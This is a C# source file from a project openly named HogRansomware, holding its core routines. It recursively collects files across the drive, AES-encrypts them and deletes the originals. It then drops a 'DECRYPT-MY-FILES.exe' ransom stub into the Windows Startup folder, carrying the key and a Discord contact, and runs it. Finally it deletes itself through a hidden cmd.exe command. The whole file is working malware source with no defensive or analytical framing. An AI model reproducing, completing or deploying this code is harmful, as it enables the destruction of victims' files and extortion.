using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using HogRansomware.Properties;

namespace HogRansomware;

public class Utils
{
	public static void EncryptFile(string path)
	{
		try
		{
			if (path.EndsWith(Settings.Extension) || new FileInfo(path).Length > Settings.MaxSize)
			{
				return;
			}
			using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
			{
				aesCryptoServiceProvider.Key = Convert.FromBase64String(Settings.Key);
				aesCryptoServiceProvider.IV = new byte[16]
				{
					120, 7, 95, 52, 29, 172, 50, 144, 112, 17,
					172, 160, 236, 37, 79, 166
				};
				using FileStream fileStream2 = new FileStream(path, FileMode.Open);
				using FileStream fileStream = File.Create(path + Settings.Extension);
				using CryptoStream destination = new CryptoStream(fileStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
				fileStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
				fileStream2.CopyTo(destination);
			}
			File.Delete(path);
		}
		catch
		{
		}
	}

	public static string Encrypt(string str)
	{
		try
		{
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String(Settings.StringEncryptionKey);
			aesCryptoServiceProvider.IV = new byte[16]
			{
				120, 7, 95, 52, 29, 172, 50, 144, 112, 17,
				172, 160, 236, 37, 79, 166
			};
			byte[] bytes = Encoding.Unicode.GetBytes(str);
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytes, 0, bytes.Length);
					cryptoStream.Close();
				}
				str = Convert.ToBase64String(memoryStream.ToArray());
			}
			return str;
		}
		catch
		{
			return str;
		}
	}

	public static IEnumerable<string> GetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				if (!path.StartsWith("C:\\Windows"))
				{
					string[] directories = Directory.GetDirectories(path);
					foreach (string item in directories)
					{
						queue.Enqueue(item);
					}
				}
			}
			catch
			{
			}
			string[] array = null;
			try
			{
				array = Directory.GetFiles(path);
			}
			catch
			{
			}
			if (array == null)
			{
				continue;
			}
			string[] array2 = array;
			foreach (string f in array2)
			{
				if (!Settings.Exclusions.Any((string x) => f.EndsWith(x)))
				{
					yield return f;
				}
			}
		}
	}

	public static string GenerateKey(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		while (length-- > 0)
		{
			rNGCryptoServiceProvider.GetBytes(array);
			uint num = BitConverter.ToUInt32(array, 0);
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[(int)(num % (uint)"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static string ParseInvite(string str)
	{
		try
		{
			string[] array = (from Match m in Regex.Matches(str, "[a-zA-Z0-9]{2,32}")
				select m.Value).ToArray();
			return array[array.Count() - 1].ToString();
		}
		catch
		{
			return null;
		}
	}

	public static void PrepareDecryptor()
	{
		Thread.Sleep(10000);
		try
		{
			string value = "%hog%" + Encrypt(Settings.Key + "%" + Settings.DiscordInvite + "%" + Settings.Extension);
			byte[] stub = Resources.Stub;
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\DECRYPT-MY-FILES.exe", stub);
			Thread.Sleep(500);
			using (FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\DECRYPT-MY-FILES.exe", FileMode.Open, FileAccess.ReadWrite, FileShare.None))
			{
				using BinaryWriter binaryWriter = new BinaryWriter(fileStream);
				fileStream.Position = fileStream.Length + 1L;
				binaryWriter.Write(value);
			}
			Thread.Sleep(500);
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\DECRYPT-MY-FILES.exe");
		}
		catch
		{
		}
	}

	public static void Melt()
	{
		ProcessStartInfo startInfo = null;
		try
		{
			startInfo = new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			};
		}
		catch
		{
		}
		finally
		{
			Process.Start(startInfo);
			Environment.Exit(0);
		}
	}
}
